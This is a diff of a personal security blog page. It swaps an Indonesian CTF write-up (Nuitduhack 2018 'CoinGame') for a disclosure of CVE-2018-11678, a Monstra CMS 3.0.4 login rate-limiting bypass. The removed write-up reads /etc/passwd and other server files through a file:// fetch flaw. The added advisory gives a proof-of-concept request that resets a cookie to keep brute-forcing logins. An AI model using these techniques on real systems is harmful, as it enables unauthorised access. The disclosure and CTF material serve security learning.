@@ -15,23 +15,23 @@
 -->
 <head>
 <meta charset="utf-8">
-<title>NUITDUHACK QUALS 2018: COINGAME - 200PTS &vert; @ABDILAHRF</title>
-<meta name="description" content="Nuitduhack Quals 2018: CoinGame - 200pts">
-<meta name="keywords" content="nuitduhack">
+<title>MONSTRA CMS - 3.0.4 LOGIN RATE LIMITING BYPASS &vert; @ABDILAHRF</title>
+<meta name="description" content="Monstra CMS - 3.0.4 Login Rate Limiting Bypass">
+<meta name="keywords" content="exploit">
 
 <!-- Twitter Cards -->
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://localhost:4000/images/logo.png">
-<meta name="twitter:title" content="Nuitduhack Quals 2018: CoinGame - 200pts">
-<meta name="twitter:description" content="Nuitduhack Quals 2018: CoinGame - 200pts">
+<meta name="twitter:title" content="Monstra CMS - 3.0.4 Login Rate Limiting Bypass">
+<meta name="twitter:description" content="Monstra CMS - 3.0.4 Login Rate Limiting Bypass">
 <meta name="twitter:creator" content="@abdilahrf">
 
 <!-- Open Graph -->
 <meta property="og:locale" content="en_US">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Nuitduhack Quals 2018: CoinGame - 200pts">
-<meta property="og:description" content="Nuitduhack Quals 2018: CoinGame - 200pts">
-<meta property="og:url" content="http://localhost:4000/ctf/writeup-nuitdohack-quals-CoinGame">
+<meta property="og:title" content="Monstra CMS - 3.0.4 Login Rate Limiting Bypass">
+<meta property="og:description" content="Monstra CMS - 3.0.4 Login Rate Limiting Bypass">
+<meta property="og:url" content="http://localhost:4000/login-rate-limiting-bypass">
 <meta property="og:site_name" content="@abdilahrf">
 <meta property="og:image" content="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460">
 
@@ -39,7 +39,7 @@
 
 
 
-<link rel="canonical" href="http://localhost:4000/ctf/writeup-nuitdohack-quals-CoinGame">
+<link rel="canonical" href="http://localhost:4000/login-rate-limiting-bypass">
 <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="@abdilahrf Feed">
 <link rel="author" href="https://plus.google.com/?rel=author">
 
@@ -122,106 +122,95 @@
                 <div class="notepad-post-title-simple row">
                     <div class="small-12 columns">
                         <div class="notepad-post-meta-simple">
-                            <h1>Nuitduhack Quals 2018: CoinGame - 200pts</h1>
-                            <p>by <strong>Abdillah Muhamad</strong> &#8212; on <a href="http://localhost:4000/tags/index.html#nuitduhack" data-toggle="tooltip" title="Posts tagged with nuitduhack" rel="tag">nuitduhack</a> <strong><time datetime="2018-04-01T00:00:00+07:00">01 Apr 2018</time></strong></p>
+                            <h1>Monstra CMS - 3.0.4 Login Rate Limiting Bypass</h1>
+                            <p>by <strong>Abdillah Muhamad</strong> &#8212; on <a href="http://localhost:4000/tags/index.html#exploit" data-toggle="tooltip" title="Posts tagged with exploit" rel="tag">exploit</a> <strong><time datetime="2018-04-01T00:00:00+07:00">01 Apr 2018</time></strong></p>
                         </div>
                     </div>
                 </div>
             </header>
 
         <article class="notepad-post-content post tag-simple">
-            <div><h2 id="problem">Problem</h2>
-<hr />
+            <div><h2 id="cve-2018-11678">CVE-2018-11678</h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Description
-Hi guy !
-Hi !
-Are you still working on your famous game?
-Yes of course, I made some modifications to make it more fun.
-Can I take a look at it?
-No, I prefer to keep it on my file server. Sorry ;)
+<ul>
+  <li><strong>Exploit Title:</strong> Monstra CMS &lt;= 3.0.4 Login Rate Limiting Bypass</li>
+  <li><strong>CVE:</strong>  CVE-2018-11678</li>
+  <li><strong>Vendor Homepage:</strong> http://monstra.org/</li>
+  <li><strong>Software Link:</strong> https://bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip</li>
+  <li><strong>Discovered by:</strong> Abdillah Muhamad</li>
+  <li><strong>Contact:</strong> abdilah.pb@gmail.com</li>
+  <li><strong>Website:</strong> https://abdilahrf.github.io</li>
+  <li><strong>Category:</strong> webapps</li>
+  <li><strong>Platform:</strong> PHP</li>
+</ul>
+
+<p>MonstraCMS 3.0.4 Implementing bruteforce protection in login form but we manage to bypass because we can control the cookie value.</p>
+
+<p><strong>Vulnerable Code:</strong> https://github.com/monstra-cms/monstra/blob/dev/plugins/box/users/users.plugin.php</p>
+
+<p>line 396-400:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="p">(</span><span class="nx">Cookie</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'login_attempts'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">Cookie</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'login_attempts'</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+            
+            <span class="nx">Notification</span><span class="o">::</span><span class="na">setNow</span><span class="p">(</span><span class="s1">'error'</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s1">'You are banned for 10 minutes. Try again later'</span><span class="p">,</span> <span class="s1">'users'</span><span class="p">));</span>
+        <span class="p">}</span> 
 </code></pre></div></div>
-<p><strong>Url :</strong> http://coingame.challs.malice.fr/</p>
+<p>line 422-427:</p>
 
-<h2 id="writeup">Writeup</h2>
-<hr />
-
-<p>Website yang diberikan memiliki fungsi untuk melakukan fetch terhadap input url yg kita berikan. dan kita dapat
-mengontrol protokol apa yang akan kita gunakan. untuk membaca lokal file saya menggunakan protokol file://
-<code class="highlighter-rouge">http://coingame.challs.malice.fr/curl.php?way=file%3A%2F%2F%2Fetc%2Fpasswd</code> =&gt; untuk file /etc/passwd</p>
-
-<p>pada file /etc/passwd kita belum menemukan informasi lokasi flag kemudian saya mencoba untuk melakukan fuzzing menggunakan burpsuite intruder untuk
-mencari configuration file pada sistem linux</p>
-
-<p><img src="../images/coingame.png" alt="Coin Game" /></p>
-
-<p>belum mendapatkan hal yang menarik, kembali ke file /etc/passwd disana terlihat
-ada user <code class="highlighter-rouge">tftp:x:104:107:tftp daemon,,,:/srv/tftp:/bin/false</code> menurut wikipedia <code class="highlighter-rouge">https://en.wikipedia.org/wiki/CURL</code> 
-curl support tftp, setelah membaca <code class="highlighter-rouge">https://help.ubuntu.com/community/TFTP</code> diketahui file configurasi untuk
-tftp yang bisa kita baca <code class="highlighter-rouge">http://coingame.challs.malice.fr/curl.php?way=file:///etc/default/tftpd-hpa</code></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-# /etc/default/tftpd-hpa
-
-TFTP_USERNAME="tftp"
-TFTP_DIRECTORY="/home/CoinGame"
-TFTP_ADDRESS="0.0.0.0:69"
-TFTP_OPTIONS="--secure --create"
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="p">(</span><span class="nx">Cookie</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'login_attempts'</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$attempts</span> <span class="o">=</span> <span class="nx">Cookie</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'login_attempts'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="nx">Cookie</span><span class="o">::</span><span class="na">set</span><span class="p">(</span><span class="s1">'login_attempts'</span><span class="p">,</span> <span class="nv">$attempts</span> <span class="p">,</span> <span class="mi">600</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">Notification</span><span class="o">::</span><span class="na">setNow</span><span class="p">(</span><span class="s1">'error'</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s1">'You are banned for 10 minutes. Try again later'</span><span class="p">,</span> <span class="s1">'users'</span><span class="p">));</span>
+        <span class="p">}</span>
 </code></pre></div></div>
+<p>line 437-442:</p>
 
-<p>sampai ke tahap dimana kita butuh kemampuan untuk <del>guessing</del> recon
-untuk mencari akun dari author soal tersebut di internet dan kita bisa temukan di copyright 
-terlihat ada username di copyright <code class="highlighter-rouge">TOTHEYELLOWMOON</code> 
-setelah kita mencari user dengan username tersebut kita menemukan 
-username-nya ada di github dan mempunyai repository <code class="highlighter-rouge">CoinGame</code> itu menandakan
-kita tidak salah orang <code class="highlighter-rouge">https://github.com/totheyellowmoon/CoinGame/</code></p>
-
-<p>dan dugaan kita diperkuat oleh Deskripsi dari repositorynya : Congrats it was the first step ! Welcome on my Github, this is my new game but I haven’t pushed the modifications …
-dari deskripsinya kita bisa menebak bahwa kode yang terbarunya hanya tersimpan di servernya dan belum di push.</p>
-
-<p>kita clone repositorynya untuk membantu kita mengambil file yang ada diserver dengan memanfaatkan filename nya,
-dan kita bandingkan md5sum nya dengan yang ada di server.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir ctf
-cd ctf
-git clone https://github.com/totheyellowmoon/CoinGame.git
-mkdir -p Server Server/photo Server/CardFiles Server/Cards Server/Decks Server/gameAnimationImages Server/photo/Drag Server/photo/Moderne Server/photo/New Server/photo/Ogres Server/photo/reve
-cd CoinGame
-#Download Core file
-dir=("" "CardFiles" "Cards" "Decks" "gameAnimationImages" "photo");for d in "${dir[@]}"; do for x in $(ls -1p $d | grep -v /);do wget "http://coingame.challs.malice.fr/curl.php?way=file:///home/CoinGame/$d/$x" -O "../Server/$d/$x";done;done
-cd photo
-#Subfolder photo
-dir=("Drag" "Moderne" "New" "Ogres" "reve");for d in "${dir[@]}"; do for x in $(ls -1p $d | grep -v /);do wget "http://coingame.challs.malice.fr/curl.php?way=file:///home/CoinGame/photo/$d/$x" -O "../../Server/photo/$d/$x";done;done
-cd ../
-#diff the file
-dir=("CardFiles" "Cards" "Decks" "gameAnimationImages" "photo" "photo/Drag" "photo/Moderne" "photo/New" "photo/Ogres" "photo/reve"); for d in "${dir[@]}"; do diff &lt;(md5sum $d/* | sed "s/$d//") &lt;(md5sum ../Server/$d/* | sed "s/\.\.\/Server\/$d//");done
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="p">(</span><span class="nx">Cookie</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'login_attempts'</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$attempts</span> <span class="o">=</span> <span class="nx">Cookie</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'login_attempts'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="nx">Cookie</span><span class="o">::</span><span class="na">set</span><span class="p">(</span><span class="s1">'login_attempts'</span><span class="p">,</span> <span class="nv">$attempts</span> <span class="p">,</span> <span class="mi">600</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">Notification</span><span class="o">::</span><span class="na">setNow</span><span class="p">(</span><span class="s1">'error'</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s1">'You are banned for 10 minutes. Try again later'</span><span class="p">,</span> <span class="s1">'users'</span><span class="p">));</span>
+        <span class="p">}</span>
 </code></pre></div></div>
 
-<p>Ide dari kode di atas adalah mendownload ulang semua file yang 
-kita ketahui dari Repository CoinGame dan mengambil file yang ada 
-di server dan lakukan perbandingan menggunakan <code class="highlighter-rouge">md5sum</code> kemudian 
-didapatkan beberapa perbedaan
-dari file yang ada di repository dan di server</p>
+<h4 id="proof-of-concept">Proof of Concept</h4>
 
-<p><img src="../images/coingame2.png" alt="Diff" /></p>
+<p>Steps to Reproduce:</p>
+<ul>
+  <li>Always set login_attempts cookie to 0 before send the POST request or if you using burp the cookie will not incrementing.</li>
+</ul>
 
-<p>flag di temukan di file background[0-3].png</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /monstra-3.0.4/admin/index.php?id=pages HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 42
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
+Cookie: PHPSESSID=lsmo61pd53fe8gnmv77uck0c07; _ga=GA1.1.876410326.1527893558; _gid=GA1.1.716559964.1527893558; login_attempts=i%3A0%3B
+Connection: close
 
-<p><img src="../images/coingame3.png" alt="Flag" /></p>
+login=admin&amp;password=[PASSWORD_HERE]&amp;login_submit=Log+In
+</code></pre></div></div>
+
+<h4 id="recommended-patch">Recommended Patch</h4>
+<p>Don’t use cookie since we can easily control the value using Session much better</p>
+
 </div>
         </article>
         <div class="cf"></div>
         <div class="row text-center">
             <section class="notepad-post-share">
-                <a class="twitter-icon" href="https://twitter.com/intent/tweet?text=&quot;Nuitduhack Quals 2018: CoinGame - 200pts&quot;%20http://localhost:4000/ctf/writeup-nuitdohack-quals-CoinGame%20via%20&#64;abdilahrf"
+                <a class="twitter-icon" href="https://twitter.com/intent/tweet?text=&quot;Monstra CMS - 3.0.4 Login Rate Limiting Bypass&quot;%20http://localhost:4000/login-rate-limiting-bypass%20via%20&#64;abdilahrf"
                     onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
                     <i class="fa fa-twitter"></i>
                 </a>
-                <a class="facebook-icon" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/ctf/writeup-nuitdohack-quals-CoinGame"
+                <a class="facebook-icon" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/login-rate-limiting-bypass"
                     onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
                     <i class="fa fa-facebook"></i>
                 </a>
-                <a class="google-icon" href="https://plus.google.com/share?url=http://localhost:4000/ctf/writeup-nuitdohack-quals-CoinGame"
+                <a class="google-icon" href="https://plus.google.com/share?url=http://localhost:4000/login-rate-limiting-bypass"
                    onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+">
                     <i class="fa fa-google-plus"></i>
                 </a>
